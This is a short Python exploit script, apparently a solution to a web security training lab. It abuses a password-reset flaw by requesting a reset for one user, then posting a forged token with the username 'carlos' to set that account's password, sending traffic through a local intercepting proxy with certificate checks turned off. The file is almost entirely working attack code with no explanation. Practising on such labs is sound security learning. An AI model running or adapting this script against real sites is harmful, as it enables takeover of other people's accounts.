import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def go_to_email_client(url):
    #open the email client
    email_client_path=url+"/forgot-password?temp-forgot-password-token=token_Modified"
    data={'temp-forgot-password-token':'token_Modified','username':'carlos','new-password-1':'peter12','new-password-2':'peter12'}
    #sending the post request
    r=requests.post(email_client_path,data=data,proxies=proxies,verify=False)
    res=r.text
    print(res)




def change_carlos_pass(s,url):
    #try to change carlos password throgh forget pass
    forget_pass_path=url+"/forgot-password"
    data={'username':'wiener'}
    #sending the request
    r=s.post(forget_pass_path,data=data,proxies=proxies,verify=False)
    res=r.text
    print(res)
    go_to_email_client(url)
    


def main():
    if len(sys.argv)!=2:
        print("[+]Usage %s <url>", sys.argv[0])
        print("[+]Example %s <url>", sys.argv[0])
    else:
        s=requests.Session()
        url=sys.argv[1] 
        change_carlos_pass(s,url)   




if __name__=="__main__":
    main()